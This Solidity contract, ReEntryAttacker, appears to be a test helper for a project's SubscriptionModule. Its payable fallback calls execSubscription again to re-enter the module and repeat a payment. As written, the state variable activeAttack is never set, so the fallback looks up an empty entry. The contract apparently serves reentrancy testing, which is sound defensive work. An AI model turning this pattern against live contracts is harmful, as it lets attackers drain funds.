pragma solidity ^0.5.0;

import "./common/Enum.sol";
import "./modules/SubscriptionModule.sol";

contract ReEntryAttacker {

    struct Payload {
        address to;
        uint256 value;
        bytes data;
        uint8 period;
        uint256 uniqId;
        uint256 startDate;
        uint256 endDate;
        bytes signatures;
    }

    address payable subModule;

    bytes32 activeAttack;

    mapping(bytes32 => Payload) public payloads;

    constructor(
        address payable _subModuleAddr
    )
    public
    {
        subModule = _subModuleAddr;
    }

    function attack(
        address payable to,
        uint256 value,
        bytes memory data,
        uint8 period,
        uint256 startDate,
        uint256 endDate,
        uint256 uniqId,
        bytes memory signatures
    )
    public
    {
        bytes32 _activeAttack = SubscriptionModule(subModule)
        .getSubscriptionHash(
            to,
            value,
            data,
            period,
            startDate,
            endDate,
            uniqId
        );

        payloads[_activeAttack] = Payload(
            to,
            value,
            data,
            period,
            startDate,
            endDate,
            uniqId,

            signatures
        );

        SubscriptionModule(subModule)
        .execSubscription(
            to,
            value,
            data,
            period,
            startDate,
            endDate,
            uniqId,

            signatures
        );
    }

    function()
    external
    payable {

        Payload storage _attack = payloads[activeAttack];

        SubscriptionModule(subModule)
        .execSubscription(
            _attack.to,
            _attack.value,
            _attack.data,
            _attack.period,
            _attack.startDate,
            _attack.endDate,
            _attack.uniqId,
            _attack.signatures
        );
    }
}
